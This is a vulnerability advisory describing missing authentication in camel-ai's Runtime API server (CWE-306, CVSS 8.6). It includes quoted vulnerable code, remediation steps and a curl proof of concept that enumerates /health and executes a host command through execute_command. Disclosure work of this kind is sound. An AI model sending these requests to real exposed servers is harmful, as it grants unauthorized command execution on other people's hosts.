# CAMEL Runtime API server exposes all registered tool endpoints without authentication, enabling unauthenticated tool invocation and host command execution when a command-execution toolkit is registered (CWE-306, CVSS 8.6)

## Summary

The Runtime API server shipped with camel-ai (`camel/runtimes/api.py`) exposes every registered tool over unauthenticated HTTP: any client that can reach the port can enumerate every registered toolkit and invoke any registered tool with arbitrary arguments -- including first-party command-execution tools -- so a deployment that registers `CodeExecutionToolkit` (whose default sandbox executes on the host) yields unauthenticated remote command execution on the host running the server. The FastAPI app is created bare, and the module's own command-line entrypoint binds the service to `0.0.0.0:8000` with no option to restrict the binding or require credentials.

## Details

`camel/runtimes/api.py` is a standalone FastAPI service: started as `python -m camel.runtimes.api <toolkit spec>...`, it consumes `sys.argv[1:]` entirely as tool specifications (`:41`), imports each entry, instantiates toolkit classes, and registers every tool function as an HTTP POST route. Nothing in the file authenticates anything:

```python
# camel/runtimes/api.py:45 -- the app is created with no middleware and
# no authentication of any kind
app = FastAPI()

# camel/runtimes/api.py:54-61 -- unauthenticated inventory disclosure
@app.get("/health")
async def health_check():
    r"""Health check endpoint that reports loaded toolkits and endpoints."""
    return {
        "status": "ok",
        "toolkits": list(_toolkit_instances.keys()),
        "endpoints": _registered_endpoints,
    }

# camel/runtimes/api.py:117-119 -- the request body is passed straight to
# the tool; no credential, token, or caller identity is ever checked
    response_data = tool.func(
        *data['args'], **data['kwargs']
    )

# camel/runtimes/api.py:145 -- every tool becomes a public POST route
app.post(f"/{endpoint_name}")(make_endpoint(func))

# camel/runtimes/api.py:151-153 -- the module's only entrypoint hardcodes
# an all-interfaces binding
if __name__ == "__main__":
    # reload=False to avoid conflicts with async toolkits (e.g., Playwright)
    uvicorn.run(app, host="0.0.0.0", port=8000, reload=False)
```

There is no authentication middleware, no token or API-key check, and no per-route dependency anywhere in the module. Because `sys.argv` is consumed entirely by tool specs, no CLI option to change the host or port -- or to enable authentication -- even exists: the all-interfaces binding on port 8000 is the only way the shipped entrypoint starts. The repository's own Docker example sets `ENV HOST=0.0.0.0`, `PORT=8000` and `EXPOSE 8000` for this server (`examples/runtimes/ubuntu_docker_runtime/Dockerfile:31-35`); its start script even passes `--host`/`--port` flags, which the module consumes as tool-spec arguments (the first unrecognized spec aborts startup with an unhandled `ValueError` at `api.py:86`) -- direct evidence that no host or port option exists.

**Why this is a vulnerability:**

- *"Serving tools over HTTP is the component's purpose; securing it is the operator's job."* The component offers no security control to configure: no auth middleware, no token check, no binding option -- the entrypoint hardcodes `0.0.0.0:8000` (`api.py:153`). A network service whose entire API is unauthenticated by construction leaves the operator no in-component control to harden -- the only mitigations available sit outside the component (firewalls, reverse proxies), which is precisely the gap treated upstream as a vulnerability in comparable OSS AI infrastructure (CVE-2025-63389: Ollama's unauthenticated API endpoints; CVE-2026-21445: Langflow's missing authentication on critical API endpoints). Unlike a conventional health check that returns a status flag, `/health` enumerates the full registered toolkit and endpoint inventory (`api.py:57-61`) -- exactly the reconnaissance an attacker needs to pick an execution endpoint.
- *"The interpreter's confirmation prompt guards command execution."* That gate is an interactive `input()` prompt on the server's own console (`camel/interpreters/subprocess_interpreter.py:385`) -- it never sees or authenticates the HTTP caller, and in a headless environment the closed-stdin `input()` raises `EOFError`, which the module's own generic exception handler turns into an HTTP 500 (`api.py:64-72`) -- a crash, not a security denial; no command runs. It is also optional: `CodeExecutionToolkit` accepts `require_confirm` as a plain constructor option (`camel/toolkits/code_execution.py:69`; default resolution at `:78-83` enables it only for host-execution sandboxes), and with `require_confirm=false` -- the configuration that makes command execution usable at all in a served, headless deployment -- submitted commands go straight to the host shell:

```python
# camel/interpreters/subprocess_interpreter.py:384-385 -- the "confirmation"
# is an interactive prompt on the server's own console
        while True:
            choice = input(prompt).lower().strip()

# camel/interpreters/subprocess_interpreter.py:469-476 -- with
# require_confirm=False the command goes straight to the host shell
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=env,
                shell=True,  # Use shell=True for command execution
            )
```

- *"Command execution requires the operator to register a code-execution toolkit."* Registering first-party toolkits is this server's entire workflow -- the CLI takes toolkit constructor specs, and `CodeExecutionToolkit` is a first-party toolkit whose default sandbox is `subprocess`, i.e. host execution (`code_execution.py:65`). The repository's own example machinery builds container images around exactly this server. Whatever tools an operator registers, any unauthenticated network client can invoke them; the defect reported here is the missing authentication boundary, not the toolkit. Choosing a container sandbox (`CodeExecutionToolkit(sandbox="docker")`) or deploying the server itself inside a container does not restore the boundary either: every registered tool, sandboxed or not, remains invocable by any unauthenticated client that reaches the published port -- the repository's own Docker example publishes exactly that port (`EXPOSE 8000`, `Dockerfile:35`).

Unlike a toolkit-level defect, this chain involves no LLM and no agent: the vulnerable component is the network service itself, and the attack is plain HTTP.

**Suggested remediation:**

1. Require authentication on every route (API-key or token middleware), enabled by default, `/health` included.
2. Bind `127.0.0.1` by default and add explicit host/port/auth CLI options (today `sys.argv` is consumed entirely by tool specs, `api.py:41`).
3. Stop disclosing the toolkit/endpoint inventory at `/health`, or gate it behind authentication.
4. Add a per-request policy gate for high-risk tools (execution allowlist) that works in headless deployments.

## Proof of Concept

Dynamically verified against camel-ai 0.2.91a5 on Windows 11 in August 2026 (9/9 automated assertions passing). No LLM backend, no credentials, and no victim interaction anywhere in the chain. Commands use POSIX paths; on Windows substitute the marker path with `%TEMP%/camel_poc_marker.txt` (forward slashes -- a single backslash as in `%TEMP%\camel_poc_marker.txt` is an invalid JSON escape sequence and the request body is rejected with a JSON-decode error before reaching the tool; note also that in cmd.exe a bare `\tmp` redirect lands on the drive root).

**Setup:** `pip install "camel-ai==0.2.91a5" "mcp<2" fastapi uvicorn tqdm`. Three dependency notes: a current `mcp` 2.x release removes `mcp.server.FastMCP`, which camel-ai 0.2.91a5's unbounded `mcp>=1.3.0` base pin does not account for -- without the `<2` pin, every `camel.toolkits` import fails at startup (`mcp` 1.29.1 restores them); `fastapi` is not a base dependency -- it ships only in camel-ai's optional extras (`web_tools`, and the aggregate `all`), while `camel/runtimes/api.py` imports it at module level (`uvicorn` arrives transitively via `mcp`); and `tqdm` -- `camel/runtimes/__init__.py` unconditionally imports `DockerRuntime` (`:17`), which imports `tqdm` at module level (`docker_runtime.py:27`), while `tqdm` is not among camel-ai 0.2.91a5's base dependencies (its only dependency stub is the dev `types-tqdm`) and current `openai` 3.x releases -- which the unbounded `openai>=1.86.0` pin resolves to -- no longer pull it transitively, so on a fresh install every `camel.runtimes` import fails with `ModuleNotFoundError: No module named 'tqdm'`.

**Start the server (operator side, the module's own entrypoint):**

```bash
python -m camel.runtimes.api \
  'camel.toolkits.MathToolkit' \
  'camel.toolkits.CodeExecutionToolkit{"verbose":true,"require_confirm":false}'
# -> Uvicorn running on http://0.0.0.0:8000
```

**Attacker side -- no authentication anywhere:**

```bash
TARGET=http://127.0.0.1:8000

# 1) unauthenticated inventory disclosure
curl -s "$TARGET/health"
# {"status":"ok","toolkits":["camel.toolkits.MathToolkit",
#  "camel.toolkits.CodeExecutionToolkit{\"verbose\":true,\"require_confirm\":false}"],
#  "endpoints":["math_add","math_subtract","math_multiply","math_divide","math_round","execute_code","execute_command"]}
# (wrapped for readability; the actual body is a single compact JSON line)

# 2) unauthenticated invocation of a registered tool
curl -s -X POST "$TARGET/math_add" \
  -H 'Content-Type: application/json' \
  -d '{"args":[3,4],"kwargs":{}}'
# {"output":"7"}

# 3) unauthenticated host command execution
curl -s -X POST "$TARGET/execute_command" \
  -H 'Content-Type: application/json' \
  -d '{"args":["echo POC_EXECUTED > /tmp/camel_poc_marker.txt"],"kwargs":{}}'
# -> HTTP 200; the command runs on the host through shell=True
cat /tmp/camel_poc_marker.txt   # -> POC_EXECUTED
```

## Impact

- **Type:** missing authentication for critical function (CWE-306) on every endpoint of a network service, plus unauthenticated information disclosure (CWE-200) at `/health`. The host-command-execution capability is reached through a registered first-party command-execution tool (`execute_command` runs commands with `shell=True`), but the defect reported here is the absent authentication boundary.
- **Who is impacted:** any operator running the Runtime API server with toolkits registered -- which is the server's sole purpose -- against any unauthenticated client that can reach the bound port (the shipped entrypoint binds `0.0.0.0:8000`).
- **Attacker capabilities:**
  - enumerate every registered toolkit and endpoint via `GET /health` without credentials;
  - invoke every registered tool with arbitrary arguments and receive its results (data reads, file writes, whatever the registered tools can do);
  - with a first-party code-execution toolkit registered with confirmation disabled (`CodeExecutionToolkit` defaults to the host-execution `subprocess` sandbox; see Details for the `require_confirm=false` condition), run arbitrary host commands with the privileges of the server process: read files and secrets, modify or destroy data, install persistence, and pivot into the host's network.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` = 8.6 (High).
  - AV:N -- a remotely reachable network service; no local access, no LLM, and no agent involved.
  - AC:L -- plain HTTP requests with fixed payloads; verified repeatedly.
  - PR:N / UI:N -- no authentication exists on any endpoint and none is configurable; no victim interaction is part of the chain.
  - S:U -- the impact lands within the vulnerable component's own security context: the server process's privileges and the tools it exposes.
  - C:H -- `/health` discloses the tool inventory (including the raw constructor-spec strings of the registered toolkits), registered tools return their results to the unauthenticated caller, and host command execution (when a command-execution toolkit is registered with `require_confirm=false`) exposes host files and secrets.
  - I:L / A:L -- the vulnerable component itself ships no destructive or availability-affecting operation; reach depends on which tools the operator registers (the same conditional command-execution chain would also raise I/A to High -- a symmetry noted transparently rather than scored).

**Scope note (alternate scoring).** Under the more common FIRST reading, a child process spawned by the vulnerable component with the same privileges on the same host stays within its security scope, so S:U applies and the submitted score is 8.6. If a maintainer instead treats the process spawned through `shell=True` as a resource outside the camel-ai component's security scope, the same vector with S:C scores **9.9** (Critical). Both values were computed with the official FIRST CVSS v3.1 formula: ISS = 1-(1-0.56)(1-0.22)(1-0.22) = 0.732304; Impact(S:U) = 6.42x0.732304 = 4.701392, Impact(S:C) = 7.52x(0.732304-0.029) - 3.25x(0.732304-0.02)^15 = 5.268808; Exploitability = 8.22x0.85x0.77x0.85x0.85 = 3.887043; Base(S:U) = round-up(4.701392+3.887043) = 8.6; Base(S:C) = round-up(min(1.08x(5.268808+3.887043), 10)) = 9.9.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `camel-ai` |
| **Affected versions** | `>= 0.2.10, <= 0.2.91a5` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `High` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` |
| **Score** | `8.6` |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-306 | Missing Authentication for Critical Function | Every endpoint -- tool invocation and `/health` alike -- has no authentication mechanism and none is configurable: the app is created bare with no middleware (`api.py:45`), every tool becomes a POST route with no authentication dependency (`api.py:145`), and `sys.argv` is consumed entirely by tool specs (`api.py:41`), so no CLI option to enable authentication exists |
| 2 | CWE-200 | Exposure of Sensitive Information to an Unauthorized Actor | `/health` (`api.py:54-61`) returns, without authentication, the full constructor-spec strings of every registered toolkit (including init parameters, which may contain secrets such as API keys) together with the complete endpoint-name inventory; confirmed by the PoC `/health` response |
